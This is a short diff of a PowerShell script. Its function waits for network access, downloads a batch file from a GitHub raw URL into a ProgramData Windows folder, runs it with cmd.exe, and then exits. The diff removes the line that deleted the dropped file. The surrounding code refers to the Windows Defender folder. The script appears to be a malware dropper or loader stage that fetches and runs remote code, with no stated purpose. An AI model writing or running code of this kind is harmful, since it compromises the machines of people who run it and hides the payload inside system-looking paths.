@@ -6,7 +6,7 @@ function getOthers{
     } until ($ping)
         Invoke-WebRequest -Uri "https://raw.githubusercontent.com/4V4loon/InspectorConfig/main/oneline.bat" -OutFile $env:ProgramData\Microsoft\Windows\one.bat 
         cmd.exe /c '%ProgramData%\Microsoft\Windows\one.bat'
-        Remove-Item -Path $env:ProgramData\Microsoft\one.bat -Force
+       
         exit
 }
 $defenderFolder = "$env:ProgramData\Microsoft\Windows Defender\"
